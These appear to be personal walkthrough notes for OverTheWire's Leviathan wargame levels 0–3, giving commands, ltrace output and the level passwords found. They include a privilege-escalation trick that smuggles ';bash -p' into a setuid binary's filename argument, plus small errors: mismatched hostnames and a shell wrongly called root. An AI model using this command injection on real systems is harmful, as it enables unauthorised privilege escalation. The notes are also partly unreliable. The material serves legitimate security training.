https://overthewire.org/wargames/leviathan/
GitHub: https://github.com/JohnHammond
https://programmercave0.github.io/blog/2020/01/06/Leviathan-Level-0-to-Level-1-OverTheWire
https://www.youtube.com/watch?v=v2xuEtvqN_0&list=PL1H1sBF1VAKVsJ0dIDJzZw_QmO1J02YvG
  
/etc/leviathan_pass = various level passwords.

 
SSH Information
      Host: leviathan.labs.overthewire.org
      Port: 2223



Level 0
 ssh leviathan0@bandit.labs.overthewire.org -p 2223
 password: leviathan0
Write up:
1. ls  -la
   output:
    drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
2.  cd .backup
    ls -la
      output:
     -rw-r----- 1 leviathan1 leviathan0 133259 Aug 26  2019 bookmarks.html
3. grep --color=always  "pass" bookmarks.html 
   output:
 ....  This will be fixed later, 
    the password for leviathan1 is rioGegei8m" ADD_DATE=......... 

password: rioGegei8m


leviathan0  Level 1
  ssh leviathan1@bandit.labs.overthewire.org -p 2223 
  password: rioGegei8m

Write up:
 1. ls  -la
   output:
    .....   -r-sr-x---  1 leviathan2 leviathan1 7452 Aug 26  2019 check
 2.  ./check
     output:
       password: assfdv
       Wrong password, Good Bye ...
   So we can't  find passward  this way
3.  ltrace ./check
    enter test 
     output:
    ....strcmp("tes", "sex")      = 1
     puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
 
   It compares test with sex. This means sex is the password the binary file need.

4.  ./check
  enter sex 
  now we are in root shell  
5. cat /etc/leviathan_pass/leviathan2 
     output:
       ougahZi8Ta  



leviathan2   
ssh leviathan2@bandit.labs.overthewire.org -p 2223 
  password:  ougahZi8Ta

Write up:
 1. ls
  output:  printfile

 2. ltrace ./printfile '/etc/leviathan_pass/leviathan2'  # We have  permission to  this  file
    output:
	 __libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 
 	access("/etc/leviathan_pass/leviathan2", 4)      = 0
 	snprintf("/bin/cat /etc/leviathan_pass/lev"…, 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
	geteuid()                                        = 12002
 	geteuid()                                        = 12002
 	setreuid(12002, 12002)                           = 0
 	system("/bin/cat /etc/leviathan_pass/lev"…ougahZi8Ta
  
 	--- SIGCHLD (Child exited) ---
 	<… system resumed> )                           = 0
 	+++ exited (status 0) +++

   
   Reviewing the ltrace, it can be determined:

     ./printfile accepts a filename argument.
      /bin/cat is used to output the requested file.
      access() checks if user leviathan2 has sufficient permissions.
      A string is prepared using snprintf(), concatenating /bin/cat with the supplied argument.
      setreuid() sets the real and effective UID of leviathan3.
      system() call supplied with the above string.


3.Attempting to run the printfile executable supplied with leviathan3‘s password file we are met with an error:

  ltrace ./printfile '/etc/leviathan_pass/leviathan3'#  # We do not have  permission to  this  file
  output:
       ....
       access("/etc/leviathan_pass/leviathan3", 4)      = -1
       puts("You cant have that file…"You cant have that file…
       )               = 27
      +++ exited (status 1) +++


  In this case, user leviathan2 does not have the necessary permissions to access a file owned by leviathan3.
  
  
  touch /tmp/rtm;bash -p
  ./printfile '/tmp/rtm;bash -p'
  whoami 
       output:leviathan3
  cat /etc/leviathan_pass/leviathan3   
        output:Ahdiemoo1j
  
 
leviathan3  
ssh leviathan3@bandit.labs.overthewire.org -p 2223 
  password: Ahdiemoo1j
  
  
  
  
leviathan4 Level 4 → Level 5
leviathan5 Level 5 → Level 6
leviathan6 Level 6 → Level 7

 
  
